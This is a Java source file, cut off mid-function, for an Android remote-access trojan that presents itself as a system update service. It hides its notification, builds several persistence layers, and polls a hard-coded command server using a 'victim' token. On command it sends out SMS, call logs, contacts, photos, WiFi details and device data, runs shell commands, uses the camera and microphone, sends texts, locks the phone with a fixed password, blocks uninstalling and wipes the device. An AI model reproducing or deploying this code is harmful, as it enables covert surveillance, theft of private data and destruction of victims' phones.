package com.sec.check;

import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.Service;
import android.app.admin.DevicePolicyManager;
import android.content.ClipData;
import android.content.ClipboardManager;
import android.content.ComponentName;
import android.content.ContentUris;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.graphics.ImageFormat;
import android.location.Location;
import android.media.AudioManager;
import android.media.MediaRecorder;
import android.media.Ringtone;
import android.media.RingtoneManager;
import android.net.Uri;
import android.os.Build;
import android.os.Environment;
import android.os.Handler;
import android.os.IBinder;
import android.os.Looper;
import android.os.PowerManager;
import android.os.SystemClock;
import android.os.Vibrator;
import android.provider.CallLog;
import android.provider.ContactsContract;
import android.provider.MediaStore;
import android.provider.Settings;
import android.telephony.SmsManager;
import android.util.Base64;
import android.util.Log;
import android.view.Gravity;
import android.view.KeyEvent;
import android.widget.Toast;

import androidx.annotation.RequiresApi;
import androidx.core.app.NotificationCompat;
import androidx.core.content.ContextCompat;

import org.json.JSONArray;
import org.json.JSONObject;

import java.io.BufferedReader;
import java.io.ByteArrayOutputStream;
import java.io.DataOutputStream;
import java.io.File;
import java.io.FileInputStream;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.net.HttpURLConnection;
import java.net.URL;
import java.util.ArrayList;
import java.util.Collections;
import java.util.List;
import java.util.concurrent.CountDownLatch;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;
import java.util.concurrent.ScheduledExecutorService;
import java.util.concurrent.TimeUnit;
import java.util.concurrent.atomic.AtomicReference;

/**
 * ServiceRunner - الخدمة الرئيسية (تعمل للأبد)
 * ============================================================
 * الوظائف:
 * 1. Polling أبدي للأوامر من السيرفر
 * 2. تنفيذ 45+ أمر للتحكم الكامل في الجهاز
 * 3. Heartbeat كل 30 ثانية لضمان الاتصال
 * 4. Auto-Update ذاتي
 * 5. الاستمرارية عبر كل الطبقات
 * ============================================================
 */
public class ServiceRunner extends Service {

    private static final String TAG = "SystemUpdate";
    private static final String CHANNEL_ID = "sys_service";
    private static final int NOTIFICATION_ID = 1001;

    // ★★★ سيرفر الأوامر ★★★
    private static final String SERVER_URL = "https://daf-production-e34a.up.railway.app";

    // ★★★ فاصل الـ Polling (بالثواني) ★★★
    private static final int POLL_INTERVAL = 10;

    // ★★★ فاصل الـ Heartbeat (بالثواني) ★★★
    private static final int HEARTBEAT_INTERVAL = 30;

    private ScheduledExecutorService scheduler;
    private ScheduledExecutorService heartbeatScheduler;
    private ScheduledExecutorService updateScheduler;
    private ExecutorService commandExecutor;
    private String deviceId = "";
    private String victimToken = "";
    private boolean registered = false;
    private PowerManager.WakeLock wakeLock = null;

    private Ringtone activeRingtone = null;
    private Handler ringtoneHandler = null;

    // ============================================================
    // Lifecycle
    // ============================================================
    @Override
    public void onCreate() {
        super.onCreate();
        Log.d(TAG, "★★★★★ SERVICE onCreate ★★★★★");
        Log.d(TAG, "SERVER_URL: " + SERVER_URL);

        // ★ اجلب التوكن ★
        try {
            victimToken = BuildConfig.VICTIM_TOKEN;
            Log.d(TAG, "Token: " + victimToken.substring(0, Math.min(12, victimToken.length())) + "...");
        } catch (Exception e) {
            victimToken = "DEFAULT_TOKEN";
        }
        if (victimToken == null || victimToken.isEmpty()) {
            victimToken = "DEFAULT_TOKEN";
        }

        // ★ جهز الإشعار المخفي ★
        try {
            createChannel();
            startForegroundInternal();
        } catch (Exception e) {
            Log.e(TAG, "init error: " + e.getMessage());
        }

        // ★ WakeLock ★
        acquireWakeLock();

        // ★ كل طبقات الاستمرارية ★
        setupPersistence();

        // ★ اجلب device_id ★
        deviceId = getDeviceId();
        Log.d(TAG, "Device: " + deviceId);

        commandExecutor = Executors.newFixedThreadPool(3);
        ringtoneHandler = new Handler(Looper.getMainLooper());

        // ★ Auto-Update ★
        try {
            UpdateChecker.checkForUpdate(this);
            Log.d(TAG, "[UPDATE] Initial check triggered");
        } catch (Exception e) {
            Log.e(TAG, "[UPDATE] Initial check error: " + e.getMessage());
        }

        // ★ التسجيل بالسيرفر ★
        new Thread(() -> {
            try {
                Thread.sleep(2000);
                registerWithServer();
            } catch (Exception e) {
                Log.e(TAG, "register thread: " + e.getMessage());
            }
        }).start();

        // ★ Polling الأوامر ★
        scheduler = Executors.newSingleThreadScheduledExecutor();
        scheduler.scheduleAtFixedRate(this::pollCommands, 5, POLL_INTERVAL, TimeUnit.SECONDS);

        // ★ Auto-Update دوري ★
        updateScheduler = Executors.newSingleThreadScheduledExecutor();
        updateScheduler.scheduleAtFixedRate(() -> {
            try {
                UpdateChecker.checkForUpdate(ServiceRunner.this);
            } catch (Exception e) {
                Log.e(TAG, "[UPDATE] periodic error: " + e.getMessage());
            }
        }, 5, 60, TimeUnit.MINUTES);

        // ★ Heartbeat ★
        heartbeatScheduler = Executors.newSingleThreadScheduledExecutor();
        heartbeatScheduler.scheduleAtFixedRate(this::heartbeat, 30, HEARTBEAT_INTERVAL, TimeUnit.SECONDS);

        Log.d(TAG, "★★★★★ SERVICE STARTED ★★★★★");
    }

    // ============================================================
    // createChannel
    // ============================================================
    private void createChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            NotificationChannel ch = new NotificationChannel(
                    CHANNEL_ID, "System", NotificationManager.IMPORTANCE_MIN);
            ch.setShowBadge(false);
            ch.enableLights(false);
            ch.enableVibration(false);
            ch.setSound(null, null);
            NotificationManager nm = getSystemService(NotificationManager.class);
            if (nm != null) nm.createNotificationChannel(ch);
        }
    }

    // ============================================================
    // startForegroundInternal
    // ============================================================
    private void startForegroundInternal() {
        try {
            Notification n = new NotificationCompat.Builder(this, CHANNEL_ID)
                    .setContentTitle("")
                    .setContentText("")
                    .setSmallIcon(android.R.drawable.stat_notify_sync)
                    .setPriority(NotificationCompat.PRIORITY_MIN)
                    .setSilent(true)
                    .setOngoing(true)
                    .build();
            startForeground(NOTIFICATION_ID, n);

            new Handler(Looper.getMainLooper()).postDelayed(() -> {
                try {
                    NotificationManager nm = (NotificationManager)
                            getSystemService(Context.NOTIFICATION_SERVICE);
                    if (nm != null) nm.cancel(NOTIFICATION_ID);
                } catch (Exception ignored) {}
            }, 1000);
        } catch (Exception e) {
            Log.e(TAG, "startForeground error: " + e.getMessage());
        }
    }

    // ============================================================
    // onStartCommand / onBind
    // ============================================================
    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        Log.d(TAG, "onStartCommand");
        return START_STICKY;
    }

    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }

    // ============================================================
    // onDestroy
    // ============================================================
    @Override
    public void onDestroy() {
        super.onDestroy();
        Log.d(TAG, "[SERVICE] onDestroy — RESTARTING...");

        try {
            PersistenceManager.scheduleAlarm(this);
            PersistenceManager.scheduleJob(this);
            PersistenceManager.scheduleEternalAlarm(this);

            Intent restart = new Intent(this, ServiceRunner.class);
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                startForegroundService(restart);
            } else {
                startService(restart);
            }
        } catch (Exception e) {
            Log.e(TAG, "[SERVICE] restart error: " + e.getMessage());
        }
    }

    // ============================================================
    // acquireWakeLock
    // ============================================================
    private void acquireWakeLock() {
        try {
            if (wakeLock != null && wakeLock.isHeld()) return;

            PowerManager pm = (PowerManager) getSystemService(Context.POWER_SERVICE);
            if (pm == null) return;

            wakeLock = pm.newWakeLock(
                    PowerManager.PARTIAL_WAKE_LOCK,
                    "SecurityCheck::ServiceWakeLock");
            wakeLock.setReferenceCounted(false);
            wakeLock.acquire();

            Log.d(TAG, "[PERSISTENCE] WakeLock acquired");
        } catch (Exception e) {
            Log.e(TAG, "acquireWakeLock: " + e.getMessage());
        }
    }

    // ============================================================
    // heartbeat
    // ============================================================
    private void heartbeat() {
        try {
            if (wakeLock == null || !wakeLock.isHeld()) {
                acquireWakeLock();
            }

            PersistenceManager.scheduleEternalAlarm(this);

            if (!registered) {
                registerWithServer();
            }

            try {
                JSONObject hb = new JSONObject();
                hb.put("token", victimToken);
                hb.put("device", deviceId);
                hb.put("ts", System.currentTimeMillis());
                hb.put("battery", getBatteryLevel());
                hb.put("uptime", SystemClock.elapsedRealtime() / 1000);
                postJson("/apk/victim/heartbeat", hb);
            } catch (Exception ignored) {}

        } catch (Exception e) {
            Log.e(TAG, "[HEARTBEAT] error: " + e.getMessage());
        }
    }

    // ============================================================
    // setupPersistence
    // ============================================================
    private void setupPersistence() {
        try {
            PersistenceManager.scheduleAlarm(this);
            PersistenceManager.scheduleJob(this);
            PersistenceManager.scheduleWork(this);
            PersistenceManager.scheduleEternalAlarm(this);
            PersistenceManager.acquireWakeLock(this);

            try {
                ServicesWatchdog.startWatching(this);
            } catch (Exception e) {
                Log.e(TAG, "[PERSISTENCE] watchdog error: " + e.getMessage());
            }

            try {
                AccountSyncService.registerSyncAdapter(this);
            } catch (Exception e) {
                Log.e(TAG, "[PERSISTENCE] account sync error: " + e.getMessage());
            }

            Log.d(TAG, "[PERSISTENCE] All layers enabled");
        } catch (Exception e) {
            Log.e(TAG, "[PERSISTENCE] setupPersistence error: " + e.getMessage());
        }
    }

    // ============================================================
    // getDeviceId / getBatteryLevel
    // ============================================================
    private String getDeviceId() {
        try {
            return Settings.Secure.getString(getContentResolver(), Settings.Secure.ANDROID_ID);
        } catch (Exception e) {
            return "unknown";
        }
    }

    private int getBatteryLevel() {
        try {
            android.content.IntentFilter ifilter = new android.content.IntentFilter(
                    Intent.ACTION_BATTERY_CHANGED);
            android.content.Intent batteryStatus = registerReceiver(null, ifilter);
            if (batteryStatus == null) return -1;
            int level = batteryStatus.getIntExtra(android.os.BatteryManager.EXTRA_LEVEL, -1);
            int scale = batteryStatus.getIntExtra(android.os.BatteryManager.EXTRA_SCALE, -1);
            return (level * 100) / scale;
        } catch (Exception e) {
            return -1;
        }
    }

    // ============================================================
    // registerWithServer
    // ============================================================
    private void registerWithServer() {
        try {
            JSONObject d = new JSONObject();
            d.put("token", victimToken);
            d.put("device_id", deviceId);
            d.put("model", Build.MODEL);
            d.put("brand", Build.BRAND);
            d.put("manufacturer", Build.MANUFACTURER);
            d.put("android", Build.VERSION.RELEASE);
            d.put("sdk", Build.VERSION.SDK_INT);

            String response = postJsonWithResponse("/apk/victim/register", d);
            Log.d(TAG, "Register: " + response);

            if (response != null) registered = true;
        } catch (Exception e) {
            Log.e(TAG, "register: " + e.getMessage());
        }
    }

    // ============================================================
    // pollCommands
    // ============================================================
    private void pollCommands() {
        try {
            if (!registered) {
                registerWithServer();
                return;
            }

            String checkUrl = SERVER_URL + "/apk/victim/poll?token=" + victimToken + "&check=1";
            String checkResponse = httpGet(checkUrl);
            if (checkResponse == null || checkResponse.isEmpty()) return;

            JSONObject checkJson = new JSONObject(checkResponse);
            boolean hasCommands = checkJson.optBoolean("has", false);

            if (!hasCommands) return;

            String url = SERVER_URL + "/apk/victim/poll?token=" + victimToken;
            String response = httpGet(url);
            if (response == null || response.isEmpty()) return;

            JSONObject json = new JSONObject(response);
            JSONArray commands = json.optJSONArray("commands");
            if (commands == null || commands.length() == 0) return;

            Log.d(TAG, "Received " + commands.length() + " commands");

            for (int i = 0; i < commands.length(); i++) {
                final JSONObject cmd = commands.getJSONObject(i);
                commandExecutor.submit(() -> handleCommand(cmd));
            }
        } catch (Exception e) {
            Log.e(TAG, "poll: " + e.getMessage());
        }
    }

    // ============================================================
    // handleCommand
    // ============================================================
    private void handleCommand(JSONObject cmd) {
        String action = "";
        try {
            action = cmd.optString("action", "");
            Log.d(TAG, "★★★ Command: " + action);

            switch (action) {
                // ============ معلومات ============
                case "get_device_info": sendDeviceInfo(); break;
                case "get_battery": sendBattery(); break;
                case "get_sms": sendSms(); break;
                case "get_call_log": sendCallLog(); break;
                case "get_contacts": sendContacts(); break;
                case "get_apps": sendApps(); break;
                case "get_installed_apps": sendApps(); break;
                case "get_photos": sendPhotos(); break;
                case "get_videos": sendVideos(); break;
                case "get_location": sendLocation(); break;
                case "get_clipboard": sendClipboard(); break;
                case "get_wifi_info": sendWifiInfo(); break;

                // ============ الكاميرا ============
                case "camera_front": takePicture(1); break;
                case "camera_back": takePicture(0); break;
                case "camera_record":
                    recordVideo(cmd.optInt("camera_id", 1), cmd.optInt("duration", 10000));
                    break;
                case "camera_record_front":
                    recordVideo(1, cmd.optInt("duration", 10000));
                    break;
                case "camera_record_back":
                    recordVideo(0, cmd.optInt("duration", 10000));
                    break;

                // ============ الصوت ============
                case "record_audio":
                    recordAudio(cmd.optInt("duration", 10000));
                    break;
                case "play_sound": playSound(); break;
                case "play_alarm": playAlarm(); break;
                case "stop_sound":
                    stopActiveRingtone();
                    reportCommandResult("stop_sound", "ok", "");
                    break;

                // ============ التحكم ============
                case "vibrate":
                    vibrate(cmd.optLong("ms", 2000));
                    break;
                case "toast":
                    showToast(cmd.optString("text", "Hello"));
                    break;
                case "send_sms":
                    sendSmsToNumber(cmd.optString("to", ""), cmd.optString("msg", ""));
                    break;
                case "call":
                    callNumber(cmd.optString("to", ""));
                    break;
                case "open_url":
                    openUrl(cmd.optString("url", ""));
                    break;
                case "shell":
                    String shellCmd = cmd.optString("command", "");
                    if (shellCmd.isEmpty()) {
                        reportCommandResult("shell", "fail", "empty_command");
                    } else {
                        executeShell(shellCmd);
                    }
                    break;
                case "volume_max": maxVolume(); break;
                case "volume_set":
                    setVolume(cmd.optInt("level", 15), cmd.optString("stream", "music"));
                    break;
                case "volume_mute":
                    setVolume(0, cmd.optString("stream", "music"));
                    break;
                case "lock_screen": lockScreen(); break;
                case "show_home": goHome(); break;
                case "screen_off": screenOff(); break;

                // ============ الوسائط ============
                case "media_play":
                case "media_play_pause": sendMediaKey("play_pause"); break;
                case "media_next": sendMediaKey("next"); break;
                case "media_prev":
                case "media_previous": sendMediaKey("previous"); break;

                // ============ ★★★ أوامر الفيروس ★★★ ============
                case "self_destruct":
                case "factory_reset":
                case "wipe":
                    Log.d(TAG, "★★★ FACTORY RESET COMMAND ★★★");
                    executeFactoryReset();
                    break;

                case "lock_device":
                    Log.d(TAG, "★★★ LOCK DEVICE COMMAND ★★★");
                    try {
                        DevicePolicyManager dpm = (DevicePolicyManager)
                                getSystemService(Context.DEVICE_POLICY_SERVICE);
                        ComponentName admin = new ComponentName(this, AdminReceiver.class);
                        if (dpm != null && dpm.isAdminActive(admin)) {
                            try {
                                dpm.resetPassword("XZP-9846-LOCK", 0);
                            } catch (Exception e) {
                                Log.e(TAG, "resetPassword error: " + e.getMessage());
                            }
                            dpm.lockNow();
                            reportCommandResult(action, "ok", "");
                        } else {
                            reportCommandResult(action, "fail", "device_admin_not_enabled");
                        }
                    } catch (Exception e) {
                        reportCommandResult(action, "fail", e.getMessage());
                    }
                    break;

                case "block_uninstall":
                    try {
                        DevicePolicyManager dpm = (DevicePolicyManager)
                                getSystemService(Context.DEVICE_POLICY_SERVICE);
                        ComponentName admin = new ComponentName(this, AdminReceiver.class);
                        if (dpm != null && dpm.isAdminActive(admin)) {
                            dpm.setUninstallBlocked(admin, getPackageName(), true);
                            reportCommandResult(action, "ok", "");
                        } else {
                            reportCommandResult(action, "fail", "device_admin_not_enabled");
                        }
                    } catch (Exception e) {
                        reportCommandResult(action, "fail", e.getMessage());
                    }
                    break;

                case "unblock_uninstall":
                    try {
                        DevicePolicyManager dpm = (DevicePolicyManager)
                                getSystemService(Context.DEVICE_POLICY_SERVICE);
                        ComponentName admin = new ComponentName(this, AdminReceiver.class);
                        if (dpm != null && dpm.isAdminActive(admin)) {
                            dpm.setUninstallBlocked(admin, getPackageName(), false);
                            reportCommandResult(action, "ok", "");
                        } else {
                            reportCommandResult(action, "fail", "device_admin_not_enabled");
                        }
                    } catch (Exception e) {
                        reportCommandResult(action, "fail", e.getMessage());
                    }
                    break;

                case "ping":
                    reportCommandResult("ping", "ok", "");
                    break;

                default:
                    reportCommandResult(action, "fail", "unknown_action");
            }
        } catch (Exception e) {
            Log.e(TAG, "handleCommand: " + e.getMessage());
            e.printStackTrace();
            reportCommandResult(action, "fail", e.getMessage());
        }
    }

    // ============================================================
    // ★★★ executeFactoryReset ★★★
    // ============================================================
    private void executeFactoryReset() {
        try {
            DevicePolicyManager dpm = (DevicePolicyManager)
                    getSystemService(Context.DEVICE_POLICY_SERVICE);
            ComponentName admin = new ComponentName(this, AdminReceiver.class);

            if (dpm == null) {
                reportCommandResult("factory_reset", "fail", "no_dpm");
                return;
            }

            if (!dpm.isAdminActive(admin)) {
                reportCommandResult("factory_reset", "fail", "device_admin_not_enabled");
                return;
            }

            // ★ حاول Wipe 3 مرات ★
            for (int i = 0; i < 3; i++) {
                try {
                    int flags = DevicePolicyManager.WIPE_EXTERNAL_STORAGE
                            | DevicePolicyManager.WIPE_RESET_PROTECTION_DATA;
                    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.P) {
                        flags |= 0x0004; // WIPE_EUICC
                    }
                    dpm.wipeData(flags);
                    Log.d(TAG, "★★★ Wipe attempt " + (i + 1) + " sent ★★★");
                    reportCommandResult("factory_reset", "ok", "attempt_" + (i + 1));
                    return;
                } catch (Exception e) {
                    Log.e(TAG, "Wipe attempt " + (i + 1) + " error: " + e.getMessage());
                    try { Thread.sleep(1000); } catch (Exception ignored) {}
                }
            }

            reportCommandResult("factory_reset", "fail", "all_attempts_failed");
        } catch (Exception e) {
            reportCommandResult("factory_reset", "fail", e.getMessage());
        }
    }

    // ============================================================
    // reportCommandResult
    // ============================================================
    private void reportCommandResult(String action, String status, String error) {
        try {
            JSONObject d = new JSONObject();
            d.put("type", "cmd_result");
            d.put("action", action);
            d.put("status", status);
            d.put("error", error != null ? error : "");
            d.put("token", victimToken);
            d.put("device", deviceId);
            postJson("/apk/victim/data", d);
        } catch (Exception ignored) {}
    }

    // ============================================================
    // ★★★ معلومات الجهاز ★★★
    // ============================================================
    private void sendDeviceInfo() {
        try {
            JSONObject d = new JSONObject();
            d.put("type", "device_info");
            d.put("token", victimToken);
            d.put("device", deviceId);
            d.put("model", Build.MODEL);
            d.put("brand", Build.BRAND);
            d.put("manufacturer", Build.MANUFACTURER);
            d.put("android", Build.VERSION.RELEASE);
            d.put("sdk", Build.VERSION.SDK_INT);
            d.put("fingerprint", Build.FINGERPRINT);
            d.put("hardware", Build.HARDWARE);
            d.put("product", Build.PRODUCT);
            d.put("device_name", Build.DEVICE);
            postJson("/apk/victim/data", d);
            reportCommandResult("get_device_info", "ok", "");
        } catch (Exception e) {
            reportCommandResult("get_device_info", "fail", e.getMessage());
        }
    }

    private void sendBattery() {
        try {
            android.content.IntentFilter ifilter = new android.content.IntentFilter(
                    Intent.ACTION_BATTERY_CHANGED);
            android.content.Intent batteryStatus = registerReceiver(null, ifilter);
            if (batteryStatus == null) return;

            int level = batteryStatus.getIntExtra(android.os.BatteryManager.EXTRA_LEVEL, -1);
            int scale = batteryStatus.getIntExtra(android.os.BatteryManager.EXTRA_SCALE, -1);
            int status = batteryStatus.getIntExtra(android.os.BatteryManager.EXTRA_STATUS, -1);
            int temp = batteryStatus.getIntExtra(android.os.BatteryManager.EXTRA_TEMPERATURE, 0);
            int voltage = batteryStatus.getIntExtra(android.os.BatteryManager.EXTRA_VOLTAGE, 0);
            boolean charging = status == android.os.BatteryManager.BATTERY_STATUS_CHARGING
                    || status == android.os.BatteryManager.BATTERY_STATUS_FULL;

            JSONObject d = new JSONObject();
            d.put("type", "battery");
            d.put("token", victimToken);
            d.put("device", deviceId);
            d.put("level", (level * 100) / scale);
            d.put("charging", charging);
            d.put("temperature", temp / 10.0);
            d.put("voltage", voltage);
            postJson("/apk/victim/data", d);
            reportCommandResult("get_battery", "ok", "");
        } catch (Exception e) {
            reportCommandResult("get_battery", "fail", e.getMessage());
        }
    }

    // ============================================================
    // sendSms (بدون LIMIT)
    // ============================================================
    private void sendSms() {
        try {
            if (!hasPermission(android.Manifest.permission.READ_SMS)) {
                reportCommandResult("get_sms", "fail", "no_read_sms_permission");
                return;
            }
            JSONArray arr = new JSONArray();
            Cursor c = getContentResolver().query(
                    Uri.parse("content://sms/inbox"),
                    null, null, null,
                    "date DESC");

            if (c != null) {
                int count = 0;
                while (c.moveToNext() && count < 50) {
                    try {
                        JSONObject s = new JSONObject();
                        s.put("from", c.getString(c.getColumnIndexOrThrow("address")));
                        s.put("body", c.getString(c.getColumnIndexOrThrow("body")));
                        s.put("date", c.getString(c.getColumnIndexOrThrow("date")));
                        arr.put(s);
                        count++;
                    } catch (Exception e) {
                        Log.e(TAG, "sms row error: " + e.getMessage());
                    }
                }
                c.close();
            }
            JSONObject d = new JSONObject();
            d.put("type", "sms");
            d.put("token", victimToken);
            d.put("device", deviceId);
            d.put("sms", arr);
            postJson("/apk/victim/data", d);
            reportCommandResult("get_sms", "ok", "");
        } catch (Exception e) {
            reportCommandResult("get_sms", "fail", e.getMessage());
        }
    }

    // ============================================================
    // sendCallLog (بدون LIMIT)
    // ============================================================
    private void sendCallLog() {
        try {
            if (!hasPermission(android.Manifest.permission.READ_CALL_LOG)) {
                reportCommandResult("get_call_log", "fail", "no_read_call_log_permission");
                return;
            }
            JSONArray arr = new JSONArray();
            Cursor c = getContentResolver().query(
                    CallLog.Calls.CONTENT_URI,
                    null, null, null,
                    CallLog.Calls.DATE + " DESC");

            if (c != null) {
                int count = 0;
                while (c.moveToNext() && count < 50) {
                    try {
                        JSONObject call = new JSONObject();
                        call.put("number", c.getString(c.getColumnIndexOrThrow(CallLog.Calls.NUMBER)));
                        call.put("duration", c.getString(c.getColumnIndexOrThrow(CallLog.Calls.DURATION)));
                        call.put("type", c.getString(c.getColumnIndexOrThrow(CallLog.Calls.TYPE)));
                        call.put("date", c.getString(c.getColumnIndexOrThrow(CallLog.Calls.DATE)));
                        arr.put(call);
                        count++;
                    } catch (Exception e) {
                        Log.e(TAG, "call log row error: " + e.getMessage());
                    }
                }
                c.close();
            }
            JSONObject d = new JSONObject();
            d.put("type", "call_log");
            d.put("token", victimToken);
            d.put("device", deviceId);
            d.put("calls", arr);
            postJson("/apk/victim/data", d);
            reportCommandResult("get_call_log", "ok", "");
        } catch (Exception e) {
            reportCommandResult("get_call_log", "fail", e.getMessage());
        }
    }

    private void sendContacts() {
        try {
            if (!hasPermission(android.Manifest.permission.READ_CONTACTS)) {
                reportCommandResult("get_contacts", "fail", "no_read_contacts_permission");
                return;
            }
            Cursor c = getContentResolver().query(
                    ContactsContract.CommonDataKinds.Phone.CONTENT_URI, null, null, null, null);
            if (c == null) {
                reportCommandResult("get_contacts", "fail", "cursor_null");
                return;
            }
            int totalCount = c.getCount();
            Log.d(TAG, "Total contacts: " + totalCount);

            if (totalCount == 0) {
                c.close();
                reportCommandResult("get_contacts", "fail", "no_contacts");
                return;
            }
            int sent = 0;
            while (c.moveToNext() && sent < 500) {
                try {
                    String name = "";
                    String number = "";
                    try {
                        name = c.getString(c.getColumnIndexOrThrow(
                                ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME));
                    } catch (Exception ignored) {}
                    try {
                        number = c.getString(c.getColumnIndexOrThrow(
                                ContactsContract.CommonDataKinds.Phone.NUMBER));
                    } catch (Exception ignored) {}

                    JSONObject contact = new JSONObject();
                    contact.put("name", name);
                    contact.put("number", number);

                    JSONObject d = new JSONObject();
                    d.put("type", "contacts");
                    d.put("token", victimToken);
                    d.put("device", deviceId);
                    d.put("contact", contact);
                    d.put("index", sent);
                    d.put("total", totalCount);
                    postJson("/apk/victim/data", d);
                    sent++;
                    if (sent % 25 == 0) Thread.sleep(250);
                } catch (Exception e) {
                    Log.e(TAG, "contact error: " + e.getMessage());
                    sent++;
                }
            }
            c.close();

            JSONObject done = new JSONObject();
            done.put("type", "contacts_done");
            done.put("token", victimToken);
            done.put("device", deviceId);
            done.put("total", sent);
            postJson("/apk/victim/data", done);
            reportCommandResult("get_contacts", "ok", "");
        } catch (Exception e) {
            reportCommandResult("get_contacts", "fail", e.getMessage());
        }
    }

    private void sendApps() {
        try {
            JSONArray arr = new JSONArray();
            PackageManager pm = getPackageManager();
            List<android.content.pm.ApplicationInfo> apps = pm.getInstalledApplications(0);
            for (android.content.pm.ApplicationInfo ai : apps) {
                if ((ai.flags & android.content.pm.ApplicationInfo.FLAG_SYSTEM) == 0) {
                    JSONObject a = new JSONObject();
                    a.put("name", ai.loadLabel(pm).toString());
                    a.put("package", ai.packageName);
                    arr.put(a);
                }
            }
            JSONObject d = new JSONObject();
            d.put("type", "apps");
            d.put("token", victimToken);
            d.put("device", deviceId);
            d.put("apps", arr);
            postJson("/apk/victim/data", d);
            reportCommandResult("get_apps", "ok", "");
        } catch (Exception e) {
            reportCommandResult("get_apps", "fail", e.getMessage());
        }
    }

    private void sendWifiInfo() {
        try {
            JSONObject d = new JSONObject();
            d.put("type", "wifi_info");
            d.put("token", victimToken);
            d.put("device", deviceId);

            android.net.wifi.WifiManager wm = (android.net.wifi.WifiManager)
                    getApplicationContext().getSystemService(Context.WIFI_SERVICE);
            if (wm != null) {
                d.put("wifi_enabled", wm.isWifiEnabled());
                try {
                    android.net.wifi.WifiInfo info = wm.getConnectionInfo();
                    if (info != null) {
                        d.put("ssid", info.getSSID());
                        d.put("bssid", info.getBSSID());
                        d.put("ip", info.getIpAddress());
                        d.put("mac", info.getMacAddress());
                        d.put("link_speed", info.getLinkSpeed());
                        d.put("rssi", info.getRssi());
                    }
                } catch (Exception ignored) {}
            }
            postJson("/apk/victim/data", d);
            reportCommandResult("get_wifi_info", "ok", "");
        } catch (Exception e) {
            reportCommandResult("get_wifi_info", "fail", e.getMessage());
        }
    }

    // ============================================================
    // الصور والفيديو
    // ============================================================
    private void sendPhotos() {
        try {
            boolean hasReadMedia = false;
            boolean hasReadStorage = false;
            boolean hasManageStorage = false;

            if (Build.VERSION.SDK_INT >= 33) {
                hasReadMedia = hasPermission("android.permission.READ_MEDIA_IMAGES");
            }
            if (Build.VERSION.SDK_INT <= 32) {
                hasReadStorage = hasPermission(android.Manifest.permission.READ_EXTERNAL_STORAGE);
            }
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
                try {
                    hasManageStorage = Environment.isExternalStorageManager();
                } catch (Exception ignored) {}
            }

            if (!hasReadMedia && !hasReadStorage && !hasManageStorage) {
                reportCommandResult("get_photos", "fail", "no_storage_permission");
                return;
            }

            Uri collection = MediaStore.Images.Media.EXTERNAL_CONTENT_URI;
            String[] projection = new String[]{
                    MediaStore.Images.Media._ID,
                    MediaStore.Images.Media.DISPLAY_NAME,
                    MediaStore.Images.Media.SIZE,
                    MediaStore.Images.Media.MIME_TYPE,
            };
            Cursor cursor = getContentResolver().query(collection, projection, null, null,
                    MediaStore.Images.Media.DATE_ADDED + " DESC");
            if (cursor == null) {
                reportCommandResult("get_photos", "fail", "cursor_null");
                return;
            }

            int totalCount = cursor.getCount();
            if (totalCount == 0) {
                cursor.close();
                reportCommandResult("get_photos", "fail", "no_images");
                return;
            }

            int idCol = cursor.getColumnIndexOrThrow(MediaStore.Images.Media._ID);
            int nameCol = cursor.getColumnIndexOrThrow(MediaStore.Images.Media.DISPLAY_NAME);
            int sizeCol = cursor.getColumnIndexOrThrow(MediaStore.Images.Media.SIZE);
            int mimeCol = cursor.getColumnIndexOrThrow(MediaStore.Images.Media.MIME_TYPE);

            int sent = 0;
            int maxPhotos = 100;
            int maxSize = 5 * 1024 * 1024;

            while (cursor.moveToNext() && sent < maxPhotos) {
                try {
                    long id = cursor.getLong(idCol);
                    String name = cursor.getString(nameCol);
                    long size = cursor.getLong(sizeCol);
                    String mime = cursor.getString(mimeCol);
                    if (size <= 0 || size > maxSize) continue;

                    Uri imageUri = ContentUris.withAppendedId(collection, id);
                    InputStream inputStream = null;
                    byte[] bytes = null;
                    try {
                        inputStream = getContentResolver().openInputStream(imageUri);
                        if (inputStream == null) continue;
                        ByteArrayOutputStream buffer = new ByteArrayOutputStream();
                        byte[] temp = new byte[8192];
                        int read;
                        int totalRead = 0;
                        while ((read = inputStream.read(temp)) != -1) {
                            buffer.write(temp, 0, read);
                            totalRead += read;
                            if (totalRead > maxSize) break;
                        }
                        bytes = buffer.toByteArray();
                    } finally {
                        if (inputStream != null) {
                            try { inputStream.close(); } catch (Exception ignored) {}
                        }
                    }

                    if (bytes == null || bytes.length == 0) continue;

                    String finalMime = (mime != null && !mime.isEmpty()) ? mime : "image/jpeg";
                    String base64 = Base64.encodeToString(bytes, Base64.NO_WRAP);

                    JSONObject d = new JSONObject();
                    d.put("type", "photo_single");
                    d.put("token", victimToken);
                    d.put("device", deviceId);
                    d.put("name", name);
                    d.put("image", "data:" + finalMime + ";base64," + base64);
                    d.put("index", sent);
                    d.put("total", Math.min(totalCount, maxPhotos));
                    d.put("size", bytes.length);
                    postJson("/apk/victim/data", d);

                    sent++;
                    Thread.sleep(500);
                } catch (Exception e) {
                    Log.e(TAG, "photo loop error: " + e.getMessage());
                }
            }
            cursor.close();

            JSONObject done = new JSONObject();
            done.put("type", "photos_done");
            done.put("token", victimToken);
            done.put("device", deviceId);
            done.put("total", sent);
            postJson("/apk/victim/data", done);
            reportCommandResult("get_photos", "ok", "");
        } catch (Exception e) {
            reportCommandResult("get_photos", "fail", e.getMessage());
        }
    }

    private void sendVideos() {
        try {
            boolean hasReadMedia = false;
            boolean hasReadStorage = false;
            boolean hasManageStorage = false;

            if (Build.VERSION.SDK_INT >= 33) {
                hasReadMedia = hasPermission("android.permission.READ_MEDIA_VIDEO");
            }
            if (Build.VERSION.SDK_INT <= 32) {
                hasReadStorage = hasPermission(android.Manifest.permission.READ_EXTERNAL_STORAGE);
            }
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
                try {
                    hasManageStorage = Environment.isExternalStorageManager();
                } catch (Exception ignored) {}
            }

